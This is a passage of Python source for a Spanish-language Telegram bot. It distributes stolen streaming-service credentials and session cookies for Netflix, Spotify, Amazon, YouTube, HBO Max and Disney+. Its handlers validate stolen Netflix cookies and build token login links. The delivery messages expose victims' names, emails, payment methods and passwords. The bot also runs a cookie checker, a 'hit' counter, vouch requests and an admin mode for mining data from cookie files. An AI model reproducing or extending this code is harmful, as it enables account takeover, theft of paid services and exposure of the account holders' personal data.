            await query.edit_message_text(start_text, parse_mode="HTML", reply_markup=START_COMMANDS_MARKUP)

    elif query.data == "menu_commands":
        commands_text = "<code>╔══════════════════════╗\n║      COMMANDS        ║\n╚══════════════════════╝\nSelecciona un módulo:</code>"
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=commands_text, parse_mode="HTML", reply_markup=COMMANDS_MARKUP)
        else:
            await query.edit_message_text(commands_text, parse_mode="HTML", reply_markup=COMMANDS_MARKUP)

    elif query.data == "menu_help":
        help_text = (
            "<code>╔══════════════════════╗\n"
            "║     CENTRO DE AYUDA  ║\n"
            "╚══════════════════════╝</code>\n\n"
            "📚 Guías rápidas para usar los módulos de streaming.\n"
            "Selecciona una categoría para continuar."
        )
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=help_text + FOOTER, parse_mode="HTML", reply_markup=HELP_MARKUP)
        else:
            await query.edit_message_text(help_text + FOOTER, parse_mode="HTML", reply_markup=HELP_MARKUP)

    elif query.data == "help_tv":
        help_tv_text = (
            "<code>╔══════════════════════╗\n"
            "║    ACTIVACIONES TV   ║\n"
            "╚══════════════════════╝</code>\n\n"
            "Selecciona la plataforma para ver su guía de uso."
        )
        await query.edit_message_text(help_tv_text + FOOTER, parse_mode="HTML", reply_markup=HELP_TV_MARKUP)

    elif query.data == "help_netflix":
        netflix_help = (
            "<code>╔══════════════════════╗\n"
            "║      NETFLIX TV      ║\n"
            "╚══════════════════════╝</code>\n\n"
            "1. Abre Netflix en tu TV.\n"
            "2. Entra en iniciar sesión y selecciona activar con teléfono o código.\n"
            "3. Envía al bot el código o una foto completa de la pantalla.\n"
            "4. Espera el resultado y sigue las instrucciones oficiales.\n\n"
            "📷 La foto no necesita estar recortada; procura que esté enfocada y sin reflejos."
        )
        await query.edit_message_text(netflix_help + FOOTER, parse_mode="HTML", reply_markup=HELP_NETFLIX_MARKUP)

    elif query.data == "help_netflix_video":
        if os.path.exists(HELP_VIDEO):
            with open(HELP_VIDEO, "rb") as video:
                await context.bot.send_video(chat_id=query.message.chat_id, video=video, caption=("<b>🎥 GUÍA NETFLIX TV</b>\n\nSigue los pasos del video para usar el proceso oficial de vinculación." + FOOTER), parse_mode="HTML", supports_streaming=True)
        else:
            await query.answer("⚠️ Video no configurado todavía.", show_alert=True)

    elif query.data == "help_hbo":
        await query.edit_message_text("<code>🔥 HBO TV\n\n1. Abre la aplicación oficial.\n2. Selecciona Activar dispositivo.\n3. Envía el código mostrado.\n4. Sigue las instrucciones oficiales.</code>" + FOOTER, parse_mode="HTML", reply_markup=HELP_TV_MARKUP)

    elif query.data == "help_crunchy":
        await query.edit_message_text("<code>🌀 CRUNCHYROLL TV\n\n1. Abre la aplicación oficial.\n2. Entra en Activar dispositivo.\n3. Envía el código mostrado o una foto clara.\n4. Si el código expiró, genera uno nuevo.</code>" + FOOTER, parse_mode="HTML", reply_markup=HELP_TV_MARKUP)

    elif query.data == "help_qr":
        await query.edit_message_text("<code>📷 GUÍA QR\n\n✅ Puedes mandar la foto completa.\n✅ Mantén la pantalla enfocada.\n✅ Evita reflejos y movimiento.\n✅ No envíes varias fotos iguales seguidas.\n✅ Si no se detecta, toma otra foto más cercana.</code>" + FOOTER, parse_mode="HTML", reply_markup=HELP_MARKUP)

    elif query.data == "help_errors":
        await query.edit_message_text("<code>⚠️ ERRORES COMUNES\n\nCódigo expirado: genera uno nuevo.\nCódigo inválido: comprueba la plataforma seleccionada.\nQR no detectado: mejora el enfoque y la luz.\nDemora: espera el resultado antes de reenviar.</code>" + FOOTER, parse_mode="HTML", reply_markup=HELP_MARKUP)

    elif query.data == "menu_tools":
        tools_text = (
            "<code>╔══════════════════════╗\n"
            "║        TOOLS         ║\n"
            "╚══════════════════════╝</code>\n\n"
            "🔗 <b>/refe</b> — genera tu enlace personal y consulta cuántas personas invitaste.\n"
            "👤 <b>/perfil</b> — muestra tus datos públicos y estadísticas dentro del bot.\n"
            "🆘 <b>/ayuda</b> — guía de activaciones TV, QR y errores comunes."
        )
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=tools_text, parse_mode="HTML", reply_markup=TOOLS_MARKUP)
        else:
            await query.edit_message_text(tools_text, parse_mode="HTML", reply_markup=TOOLS_MARKUP)

    elif query.data == "tool_profile":
        profile = update_user_profile(query.from_user)
        username = f"@{profile.get('username')}" if profile.get('username') else "Sin username"
        full_name = " ".join(x for x in [profile.get('first_name'), profile.get('last_name')] if x).strip() or "Agent"
        profile_text = (
            "<code>╔══════════════════════╗\n"
            "║        PERFIL        ║\n"
            "╚══════════════════════╝</code>\n\n"
            f"👤 <b>Nombre:</b> {escape_html(full_name)}\n"
            f"🔗 <b>Usuario:</b> {escape_html(username)}\n"
            f"🏆 <b>Hits:</b> {int(profile.get('hits', 0))}"
        )
        await query.message.reply_html(profile_text + FOOTER)

    elif query.data == "menu_apps_tv":
        apps_text = "<code>╔══════════════════════╗\n║      APPS / TV       ║\n╚══════════════════════╝\nSelecciona una plataforma:</code>"
        await query.edit_message_caption(caption=apps_text, parse_mode="HTML", reply_markup=APPS_TV_MARKUP) if query.message.photo or query.message.video else await query.edit_message_text(apps_text, parse_mode="HTML", reply_markup=APPS_TV_MARKUP)

    elif query.data == "menu_cookies":
        cookies_text = "<code>╔══════════════════════╗\n║       COOKIES        ║\n╚══════════════════════╝\nSelecciona un servicio:</code>"
        await query.edit_message_caption(caption=cookies_text, parse_mode="HTML", reply_markup=build_cookies_markup()) if query.message.photo or query.message.video else await query.edit_message_text(cookies_text, parse_mode="HTML", reply_markup=build_cookies_markup())

    elif query.data == "menu_accounts":
        accounts_text = "<code>╔══════════════════════╗\n║      CUENTAS ACC     ║\n╚══════════════════════╝\nSelecciona una cuenta:</code>"
        await query.edit_message_caption(caption=accounts_text, parse_mode="HTML", reply_markup=ACCOUNTS_MARKUP) if query.message.photo or query.message.video else await query.edit_message_text(accounts_text, parse_mode="HTML", reply_markup=ACCOUNTS_MARKUP)

    elif query.data == "menu_nfx":
        # Usamos el menú original de NetflixBot; un video requiere editar caption.
        nfx_text = nfx.START_MSG + FOOTER
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=nfx_text, parse_mode='HTML', reply_markup=nfx.MAIN_MARKUP)
        else:
            await query.edit_message_text(nfx_text, parse_mode='HTML', reply_markup=nfx.MAIN_MARKUP)
        context.user_data['mode'] = 'netflix'
    
    elif query.data == "menu_hbo":
        hbo_text = f"<code>\n █▓▒░ HBO MAX INJECTOR ░▒▓█\n\n Ingresa el código de 6 dígitos.\n</code>{FOOTER}"
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=hbo_text, parse_mode='HTML')
        else:
            await query.edit_message_text(hbo_text, parse_mode='HTML')
        context.user_data['mode'] = 'hbo'
    
    elif query.data == "menu_crunchy":
        crunchy_text = f"<code>\n █▓▒░ CRUNCHYROLL BYPASS ░▒▓█\n\n Ingresa el código de activación.\n</code>{FOOTER}"
        if query.message.photo or query.message.video:
            await query.edit_message_caption(caption=crunchy_text, parse_mode='HTML')
        else:
            await query.edit_message_text(crunchy_text, parse_mode='HTML')
        context.user_data['mode'] = 'crunchy'

    elif query.data == "menu_spotify":
        await query.edit_message_text(f"<code>\n █▓▒░ SPOTIFY INTERCEPTOR ░▒▓█\n\n Pulsa el botón para obtener una cookie.\n</code>{FOOTER}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🎧 [ GET SPOTY COOKIE ]", callback_data="get_spoty_cookie")],
            [InlineKeyboardButton("🔙 [ VOLVER ]", callback_data="check_join")]
        ]))
        
    elif query.data == "menu_disney":
        disney_menu_msg = (
            "<code>\n"
            " █▓▒░ DISNEY+ ARSENAL ░▒▓█\n\n"
            " [!] AVISO IMPORTANTE:\n"
            " Solo se permiten 2 CUENTAS por día\n"
            " para cada Agente.\n\n"
            " Pulsa el botón para obtener una cuenta.\n"
            "</code>"
        )
        await query.edit_message_text(disney_menu_msg + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🏰 [ GET DISNEY ACC ]", callback_data="get_disney_acc")],
            [InlineKeyboardButton("🔙 [ VOLVER ]", callback_data="check_join")]
        ]))
    
    elif query.data == "menu_amazon":
        await query.edit_message_text(f"<code>\n █▓▒░ AMAZON PRIME VIDEO ░▒▓█\n\n Pulsa el botón para obtener una cookie.\n</code>{FOOTER}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📦 [ GET AMAZON COOKIE ]", callback_data="get_amazon_cookie")],
            [InlineKeyboardButton("🔙 [ VOLVER ]", callback_data="check_join")]
        ]))

    elif query.data == "menu_youtube":
        await query.edit_message_text(f"<code>\n █▓▒░ YOUTUBE PREMIUM ░▒▓█\n\n Pulsa el botón para obtener una cookie.\n</code>{FOOTER}", parse_mode='HTML', reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔴 [ GET YT COOKIE ]", callback_data="get_youtube_cookie")],
            [InlineKeyboardButton("🔙 [ VOLVER ]", callback_data="check_join")]
        ]))

    elif query.data == "menu_tempmail":
        await handle_tempmail_menu(update, context)
    elif query.data == "gen_new_mail":
        await handle_tempmail_menu(update, context, new=True)
    elif query.data == "check_inbox":
        await handle_check_inbox(update, context)
    elif query.data.startswith("read_msg_"):
        await handle_read_message(update, context, query.data.split("_")[-1])

    elif query.data == "menu_vsms":
        await handle_vsms_menu(update, context)
    elif query.data.startswith("check_sms_"):
        await handle_check_sms(update, context, query.data.split("_")[-1])
    
    elif query.data == "get_hbo_acc":
        asyncio.create_task(drop_hbo_account(update, context))
    elif query.data == "get_nf_cookie":
        asyncio.create_task(drop_nf_cookie(update, context))
    elif query.data == "get_spoty_cookie":
        asyncio.create_task(drop_spotify_cookie(update, context))
    elif query.data == "get_amazon_cookie":
        asyncio.create_task(drop_amazon_cookie(update, context))
    elif query.data == "get_youtube_cookie":
        asyncio.create_task(drop_youtube_cookie(update, context))
    elif query.data == "get_disney_acc":
        asyncio.create_task(drop_disney_account(update, context))
    
    elif query.data.startswith("mode_") or query.data in ["start_check", "stop_check", "get_hits", "result_txt", "result_zip"]:
        # Conexión directa a las funciones del script original de NetflixBot
        try:
            if query.data.startswith("mode_"): await nfx.mode_button(update, context)
            elif query.data == "start_check": await nfx.start_check(update, context)
            elif query.data == "stop_check": await nfx.stop_check(update, context)
            elif query.data == "get_hits": await nfx.get_hits(update, context)
            elif query.data == "result_txt": await nfx.send_result_txt(update, context)
            elif query.data == "result_zip": await nfx.send_result_zip(update, context)
        except AttributeError as e:
            print(f"Error de conexión con NetflixBot: {e}")
            await query.answer("❌ Error: El script NetflixBot no tiene esta función.", show_alert=True)
        
    # --- ADMIN CALLBACKS (FIXED) ---
    elif query.data == "admin_panel":
        await admin_panel(update, context)
    
    # --- FEEDBACK SYSTEM ---
    elif query.data == "feedback_ok":
        await query.answer("✅ ¡Gracias por tu reporte! Hit confirmado.", show_alert=True)
        await query.edit_message_reply_markup(reply_markup=None)
        # Opcional: Podrías añadir un mensaje de agradecimiento al final del texto original
        new_text = query.message.text_html + "\n\n<code>[✔] ESTADO: FUNCIONANDO</code>"
        try: await query.edit_message_text(new_text, parse_mode='HTML', disable_web_page_preview=True)
        except: pass
        
    elif query.data == "feedback_fail":
        await query.answer("❌ Reportado. El administrador revisará el stock pronto.", show_alert=True)
        await query.edit_message_reply_markup(reply_markup=None)
        new_text = query.message.text_html + "\n\n<code>[✖] ESTADO: REPORTADO / MUERTA</code>"
        try: await query.edit_message_text(new_text, parse_mode='HTML', disable_web_page_preview=True)
        except: pass
        
        # Notificar al admin sobre la cuenta muerta
        username = query.from_user.username or query.from_user.first_name
        admin_alert = (
            f"⚠️ <b>REPORTE DE CUENTA MUERTA</b>\n\n"
            f"👤 <b>Usuario:</b> @{username}\n"
            f"🆔 <b>ID:</b> <code>{query.from_user.id}</code>\n"
            f"🎬 <b>Servicio:</b> {context.user_data.get('last_activation', 'Desconocido')}\n"
            f"❗ <b>Acción:</b> Revisar stock de inmediato."
        )
        try: await context.bot.send_message(chat_id=OWNER_ID, text=admin_alert, parse_mode='HTML')
        except: pass
    elif query.data == "admin_stats":
        await stats(update, context)
    elif query.data == "admin_clean_amazon":
        asyncio.create_task(clean_amazon(update, context))
    elif query.data == "admin_clean_spotify":
        asyncio.create_task(clean_spotify(update, context))
    elif query.data == "admin_clean_youtube":
        asyncio.create_task(clean_youtube(update, context))
    elif query.data == "admin_check_disney":
        asyncio.create_task(check_disney_bulk(update, context))
    elif query.data == "admin_broadcast":
        await query.message.reply_html("<code>[!] Para difusión usa: /difusion <mensaje></code>")
    elif query.data == "admin_maintenance":
        state = load_maintenance_state()
        rows = [f"{'🛠️' if state[key] else '🟢'} {label}: {'MANTENIMIENTO' if state[key] else 'ONLINE'}" for key, label in MAINTENANCE_MODULES.items()]
        maintenance_text = "<code>█▓▒░ MAINTENANCE CONTROL ░▒▓█\n\n" + "\n".join(rows) + "\n\nUso:\n/mantenimiento netflix on|off\n/mantenimiento prime on|off\n/mantenimiento spotify on|off\n/mantenimiento youtube on|off</code>"
        await query.edit_message_text(maintenance_text + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 ACTUALIZAR", callback_data="admin_maintenance")], [InlineKeyboardButton("🔙 VOLVER AL PANEL", callback_data="admin_panel")]]))
    elif query.data == "admin_monitor":
        await handle_admin_monitor(update, context)
    elif query.data == "admin_extractor":
        await query.message.reply_html("<code>[!] MODO EXTRACTOR ACTIVADO.\n[>] Envía el contenido de la cookie o el archivo .txt para minar datos.</code>")
        context.user_data['mode'] = 'admin_extract'

# --- FUNCIONES SPOTIFY DROP ---
def format_spotify_drop(info, filename):
    """Diseño Hacker interno para las cookies de Spotify."""
    plan = info.get('plan', 'Premium/Free (Verified)')
    country = info.get('country', 'Unknown')
    
    # Detectar plan por nombre de archivo si es posible
    fname = filename.lower()
    if "premium" in fname: plan = "PREMIUM 💎"
    elif "family" in fname: plan = "FAMILY 👨‍👩‍👧‍👦"
    elif "duo" in fname: plan = "DUO 👥"
    elif "free" in fname: plan = "FREE 🎧"

    msg = (
        "<code>╔══════════════════════════════════╗\n"
        "║  ░▒▓█ SPOTIFY INTERCEPTOR █▓▒░   ║\n"
        "╚══════════════════════════════════╝</code>\n\n"
        f"🛡️ <b>STATUS:</b> VERIFIED\n"
        f"💎 <b>PLAN:</b> {plan}\n"
        f"🌍 <b>REGION:</b> {country}\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "📁 <b>FILE:</b> SPOTIFY_COOKIE.txt\n"
        "📱 <b>MB:</b> Usa Kiwi Browser\n"
        "🖥️ <b>PC:</b> Importa en Cookie-Editor\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>"
    )
    return msg

async def send_vouch_request(update, context, platform):
    vouch_msg = (
        "<code>\n"
        " ╔══════════════════════════════════╗\n"
        " ║   [!] ATENCIÓN: SUBE TU PRUEBA   ║\n"
        " ╚══════════════════════════════════╝\n"
        "</code>\n"
        "<b>Para seguir mejorando y demostrar que somos los mejores, por favor envía una captura de pantalla usando la cuenta ahora mismo.</b>\n\n"
        "<i>¡Tu apoyo nos hace crecer!</i>"
    )
    await update.effective_message.reply_html(vouch_msg + FOOTER)

async def drop_spotify_cookie(update, context):
    query = update.callback_query
    if not await maintenance_guard(query, "spotify"):
        return
    user_id = query.from_user.id
    ahora = time.time()
    if user_id != OWNER_ID:
        last_time = spoty_cookie_cooldowns.get(user_id, 0)
        restante = int(SPOTY_COOKIE_COOLDOWN - (ahora - last_time))
        if restante > 0:
            await query.answer(f"⏳ ESPERA {restante}s PARA OTRA COOKIE", show_alert=True)
            return
            
    status_msg = await query.message.reply_html("<code>[+] SCANNING SPOTIFY VAULT...\n[+] ANALYZING ARSENAL...</code>")
    
    # Buscar en subcarpetas Premium primero, luego Free, luego raíz
    premium_files = glob.glob(os.path.join("cookies_spotify", "Premium", "*"))
    free_files = glob.glob(os.path.join("cookies_spotify", "Free", "*"))
    root_files = glob.glob(os.path.join("cookies_spotify", "*"))
    
    # Filtrar solo archivos (no carpetas) de root_files
    root_files = [f for f in root_files if os.path.isfile(f)]
    
    cookie_files = premium_files + root_files + free_files
    
    if not cookie_files:
        await status_msg.edit_text(f"<code>[-] ERROR: Spotify Vault is empty.</code>{FOOTER}", parse_mode='HTML')
        return
        
    # Elegir la mejor disponible (Premium tiene prioridad por el orden de la lista)
    chosen_file = cookie_files[0]
    
    try:
        spoty_cookie_cooldowns[user_id] = ahora
        info = {"ok": True}
        delivery_msg = format_spotify_drop(info, chosen_file)
        
        await status_msg.delete()
        # Inyectar sello en el archivo antes de enviar
        with open(chosen_file, "r", encoding='utf-8', errors='ignore') as f:
            cookie_content = f.read()
        
        # Limpiar cabeceras antiguas
        clean_lines = []
        for line in cookie_content.splitlines():
            if line.startswith("#"):
                continue
            clean_lines.append(line)
        
        sealed_content = (
            "#SPOTIFY COOKIES CHECKER\n"
            "#SOFTWARE: SPOTIFY COOKIES CHECKER BY @Zzzz_0456\n"
            "#VERSION: V2.0.5\n"
            "#OWNER: @Zzzz_0456\n\n"
        ) + "\n".join(clean_lines)
        
        temp_file = f"temp_spotify_{user_id}.txt"
        with open(temp_file, "w", encoding='utf-8') as f:
            f.write(sealed_content)

        with open(temp_file, "rb") as doc:
            await context.bot.send_document(
                chat_id=update.effective_chat.id, 
                document=doc, 
                filename="SPOTIFY_COOKIE.txt",
                caption=delivery_msg, 
                parse_mode='HTML',
                reply_markup=FEEDBACK_MARKUP
            )
        if os.path.exists(temp_file): os.remove(temp_file)
        
        username = update.effective_user.username or update.effective_user.first_name
        context.user_data['last_activation'] = 'SPOTIFY COOKIE'
        asyncio.create_task(post_hit(context, username, "SPOTIFY COOKIE DROP"))
        increment_user_hits(update.effective_user)
        await send_vouch_request(update, context, "SPOTIFY COOKIE")
    except Exception as e:
        await status_msg.edit_text(f"<code>[-] ERROR AL ENTREGAR: {str(e)}</code>{FOOTER}", parse_mode='HTML')

# --- FUNCIONES TEMP MAIL HANDLERS ---
async def handle_tempmail_menu(update, context, new=False):
    query = update.callback_query
    if new or 'temp_email' not in context.user_data:
        email = get_random_email()
        if not email:
            await query.answer("❌ Error generando mail.", show_alert=True)
            return
        context.user_data['temp_email'] = email
    
    email = context.user_data['temp_email']
    msg = (
        "<code>\n"
        " █▓▒░ TEMP MAIL GENERATOR ░▒▓█\n\n"
        f" [>] EMAIL: {email}\n"
        " [>] STATUS: ACTIVE\n"
        "</code>"
    )
    keyboard = [
        [InlineKeyboardButton("🔄 GENERAR NUEVO", callback_data="gen_new_mail")],
        [InlineKeyboardButton("📥 VER BANDEJA", callback_data="check_inbox")],
        [InlineKeyboardButton("🔙 VOLVER", callback_data="check_join")]
    ]
    await query.edit_message_text(msg + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_check_inbox(update, context):
    query = update.callback_query
    email = context.user_data.get('temp_email')
    if not email: return
    login, domain = email.split("@")
    messages = check_inbox_api(login, domain)
    if not messages:
        await query.answer("📭 Bandeja vacía.", show_alert=True)
        return
    
    keyboard = []
    for m in messages[:5]:
        keyboard.append([InlineKeyboardButton(f"📩 {m['from']} - {m['subject'][:20]}...", callback_data=f"read_msg_{m['id']}")])
    keyboard.append([InlineKeyboardButton("🔙 VOLVER", callback_data="menu_tempmail")])
    
    await query.edit_message_text("<code>[+] MENSAJES RECIBIDOS:</code>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

async def handle_read_message(update, context, msg_id):
    query = update.callback_query
    email = context.user_data.get('temp_email')
    login, domain = email.split("@")
    msg = read_message_api(login, domain, msg_id)
    if not msg: return
    
    text = (
        f"<b>DE:</b> {msg['from']}\n"
        f"<b>ASUNTO:</b> {msg['subject']}\n"
        f"<b>FECHA:</b> {msg['date']}\n\n"
        f"<b>CONTENIDO:</b>\n<code>{msg['textBody'][:3000]}</code>"
    )
    keyboard = [[InlineKeyboardButton("🔙 VOLVER", callback_data="check_inbox")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# --- SMS VIRTUAL HANDLERS ---
async def handle_vsms_menu(update, context):
    query = update.callback_query
    numbers = get_public_numbers()
    if not numbers:
        await query.answer("❌ No hay números disponibles.", show_alert=True)
        return
    
    keyboard = []
    for n in numbers:
        keyboard.append([InlineKeyboardButton(f"🌍 {n['country']} | {n['display']}", callback_data=f"check_sms_{n['number']}")])
    keyboard.append([InlineKeyboardButton("🔙 VOLVER", callback_data="check_join")])
    
    msg = "<code>\n █▓▒░ VIRTUAL SMS NUMBERS ░▒▓█\n\n Selecciona un número para ver los SMS:\n</code>"
    await query.edit_message_text(msg + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_check_sms(update, context, phone):
    query = update.callback_query
    messages = get_sms_messages(phone)
    if not messages:
        await query.answer("📭 No hay mensajes aún.", show_alert=True)
        return
    
    text = f"<code>[+] SMS PARA: +{phone}</code>\n\n"
    for m in messages:
        text += f"━━━━━━━━━━━━━━━━━━━━\n<b>DE:</b> {m['sender']}\n<b>HACE:</b> {m['time']}\n<b>MSG:</b> <code>{m['content']}</code>\n"
    
    keyboard = [[InlineKeyboardButton("🔙 VOLVER", callback_data="menu_vsms")]]
    await query.edit_message_text(text + FOOTER, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

# --- DROPS DE CUENTAS Y COOKIES ---
async def drop_nf_cookie(update, context):
    query = update.callback_query
    if not await maintenance_guard(query, "netflix"):
        return
    user_id = query.from_user.id
    ahora = time.time()
    if user_id != OWNER_ID:
        last_time = nf_cookie_cooldowns.get(user_id, 0)
        restante = int(NF_COOKIE_COOLDOWN - (ahora - last_time))
        if restante > 0:
            await query.answer(f"⏳ ESPERA {restante}s PARA OTRA COOKIE", show_alert=True)
            return
    status_msg = await query.message.reply_html("<code>[+] SCANNING NETFLIX VAULT...\n[+] ANALYZING ARSENAL...</code>")
    cookie_files = glob.glob(os.path.join("vault", "*"))
    if not cookie_files:
        await status_msg.edit_text(f"<code>[-] ERROR: Netflix Vault is empty.</code>{FOOTER}", parse_mode='HTML')
        return
    random.shuffle(cookie_files)
    chosen_file = None
    info = None
    cookie_dict = None
    
    for f in cookie_files:
        try:
            # Primero parsear el archivo para obtener el dict de cookies
            with open(f, 'r', encoding='utf-8', errors='ignore') as file_handle:
                content = file_handle.read()
            
            # El NetflixBot tiene varios bloques de cookies, probamos el primero válido
            parsed_results = nfx.parse_cookie_file(content)
            if not parsed_results: continue
            
            for block_name, c_dict in parsed_results:
                check_res = await dispatch_mission(nfx.check_netflix_cookie, c_dict)
                if check_res.get('ok'):
                    chosen_file = f
                    info = check_res
                    cookie_dict = c_dict
                    break
            
            if chosen_file: break
        except Exception as e:
            print(f"Error verificando cookie {f}: {e}")
            continue
            
    if not chosen_file:
        await status_msg.edit_text(f"<code>[-] FAILED: No se encontraron cookies vivas en el Vault.</code>{FOOTER}", parse_mode='HTML')
        return
    
    try:
        nf_cookie_cooldowns[user_id] = ahora
        # Generar token de acceso directo
        token_data, err = nfx.generate_nftoken(cookie_dict)
        token_val = token_data.get('token') if token_data else None
        
        # Construir links de acceso (solo si el token es válido)
        access_links = ""
        if token_val:
            access_links = (
                f"🖥️ <b>PC:</b> <a href='https://netflix.com/?nftoken={token_val}'>Click to Login</a>\n"
                f"📱 <b>MB:</b> <a href='https://www.netflix.com/unsupported?nftoken={token_val}'>Click to Login</a>\n\n"
                "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            )
        else:
            access_links = "⚠️ <b>Direct Login:</b> Not available for this cookie.\n\n<b>━━━━━━━━━━━━━━━━━━━━</b>\n"

        delivery_msg = (
            "<code>╔══════════════════════════════════╗\n║  ░▒▓█ NETFLIX PREMIUM █▓▒░      ║\n╚══════════════════════════════════╝</code>\n\n"
            f"👤 <b>Nombre:</b> {info.get('name')}\n📧 <b>Correo:</b> {info.get('email')}\n🌍 <b>País:</b> {info.get('country')}\n📦 <b>Plan:</b> {info.get('plan')}\n"
            f"📅 <b>Miembro desde:</b> {info.get('member_since')}\n⏳ <b>Próximo Cobro:</b> {info.get('next_billing')}\n💳 <b>Pago:</b> {info.get('payment_method')}\n"
            f"📺 <b>Calidad:</b> {info.get('video_quality')}\n🎥 <b>Pantallas:</b> {info.get('max_streams')}\n✅ <b>Correo Verificado:</b> {info.get('email_verified')}\n"
            f"👥 <b>Perfiles:</b> {info.get('profiles')}\n\n<b>━━━━━━━━━━━━━━━━━━━━</b>\n🍪 <b>NETFLIX COOKIE:</b>\n<code>{cookie_dict.get('NetflixId')}</code>\n<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"{access_links}"
            f"👑 <b>OWNER:</b> {OWNER_HANDLE}\n<b>━━━━━━━━━━━━━━━━━━━━</b>"
        )
        await status_msg.edit_text(delivery_msg, parse_mode='HTML', disable_web_page_preview=True, reply_markup=FEEDBACK_MARKUP)
        username = update.effective_user.username or update.effective_user.first_name
        context.user_data['last_activation'] = 'NETFLIX COOKIE'
        asyncio.create_task(post_hit(context, username, "NETFLIX COOKIE DROP"))
        increment_user_hits(update.effective_user)
        await send_vouch_request(update, context, "NETFLIX COOKIE")
    except Exception as e: await status_msg.edit_text(f"<code>[!] ERROR: {str(e)}</code>{FOOTER}", parse_mode='HTML')

async def drop_hbo_account(update, context):
    query = update.callback_query
    status_msg = await query.message.reply_html("<code>[+] ACCESSING CLOUD SERVER...\n[+] DECRYPTING DATABASE...</code>")
    accounts = cargar_json(HBO_ACC_FILE, [])
    if not accounts:
        await status_msg.edit_text(f"<code>[-] ERROR: HBO Arsenal is empty.</code>{FOOTER}", parse_mode='HTML')
        return
    random.shuffle(accounts)
    acc = accounts[0]
    email, password = acc.split(":")
    delivery_msg = f"<code>\n ╔══════════════════════════════════╗\n ║  ░▒▓█ ACCOUNT RETRIEVED █▓▒░     ║\n ╚══════════════════════════════════╝\n\n 📧 EMAIL: {email}\n 🔑 PASS: {password}\n\n [!] LOGIN FAST, AGENT.\n</code>"
    await status_msg.edit_text(delivery_msg + FOOTER, parse_mode='HTML', reply_markup=FEEDBACK_MARKUP)
    username = update.effective_user.username or update.effective_user.first_name
    context.user_data['last_activation'] = 'HBO MAX ACC'
    asyncio.create_task(post_hit(context, username, "HBO MAX ACC"))
    increment_user_hits(update.effective_user)
    await send_vouch_request(update, context, "HBO MAX ACC")

async def drop_disney_account(update, context):
    query = update.callback_query
    user_id = query.from_user.id
    ahora = time.time()
    
    # Lógica de Límite Diario (2 cuentas)
    if user_id != OWNER_ID:
        usage = disney_daily_usage.get(user_id, {"count": 0, "last_reset": ahora})
        # Resetear si han pasado más de 24 horas
        if ahora - usage["last_reset"] > 86400:
            usage = {"count": 0, "last_reset": ahora}
            
        if usage["count"] >= DISNEY_DAILY_LIMIT:
            await query.answer("❌ LÍMITE ALCANZADO: Máximo 2 cuentas por día.", show_alert=True)
            return
            
        last_time = disney_cooldowns.get(user_id, 0)
        restante = int(DISNEY_COOLDOWN - (ahora - last_time))
        if restante > 0:
            await query.answer(f"⏳ ESPERA {restante}s PARA OTRA CUENTA", show_alert=True)
            return
            
    status_msg = await query.message.reply_html("<code>[+] ACCESSING DISNEY+ VAULT...\n[+] DECRYPTING DATABASE...</code>")
    account, status = disney.get_random_disney_account(DISNEY_ACC_FILE)
    
    if not account:
        await status_msg.edit_text(status + FOOTER, parse_mode='HTML')
        return
        
    disney_cooldowns[user_id] = ahora
    formatted_msg = disney.format_disney_drop(account)
    
    # --- FLUJO DE ENTREGA GOZU ---
    # 1. Borrar el mensaje de "Cargando..."
    await status_msg.delete()

    # 2. Enviar la Imagen Hacker
    if os.path.exists("disney_banner.jpg"):
        with open("disney_banner.jpg", "rb") as photo:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
            
    # 3. Enviar los Datos de la Cuenta (Mensaje Nuevo para que quede debajo)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=formatted_msg, parse_mode='HTML', reply_markup=FEEDBACK_MARKUP)
    
    # 4. Incrementar contador diario
    if user_id != OWNER_ID:
        usage = disney_daily_usage.get(user_id, {"count": 0, "last_reset": ahora})
        usage["count"] += 1
        disney_daily_usage[user_id] = usage

    # 5. Notificar Hit y Pedir Referencia
    username = update.effective_user.username or update.effective_user.first_name
    context.user_data['last_activation'] = 'DISNEY+ ACC'
    asyncio.create_task(post_hit(context, username, "DISNEY+ ACC"))
    increment_user_hits(update.effective_user)
    await send_vouch_request(update, context, "DISNEY+ ACC")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # --- FILTRO DE SEGURIDAD PARA GRUPOS ---
    # El bot solo procesará texto directo (códigos) en chats privados para evitar spam en grupos.
    if update.effective_chat.type != 'private': return

    user_id = update.effective_user.id
    guardar_usuario(user_id)
    if not await check_membership(context.bot, user_id): return
    
    text = update.message.text.strip()
    mode = context.user_data.get('mode')
    
    # Validación de Códigos HBO (6 dígitos numéricos)
    if mode == 'hbo' and len(text) == 6 and text.isdigit():
        asyncio.create_task(fast_hbo_activation(update, context, text))
        
    # Validación de Códigos Crunchyroll (Generalmente 6 caracteres alfanuméricos)
    elif mode == 'crunchy' and len(text) >= 6 and len(text) <= 10:
        asyncio.create_task(fast_crunchy_activation(update, context, text))
        
    # Extractor Administrativo (Solo Owner)
    elif mode == 'admin_extract' and update.effective_user.id == OWNER_ID:
        asyncio.create_task(handle_admin_extraction(update, context, text))
        
    # Detección automática de Netflix TV (8 dígitos)
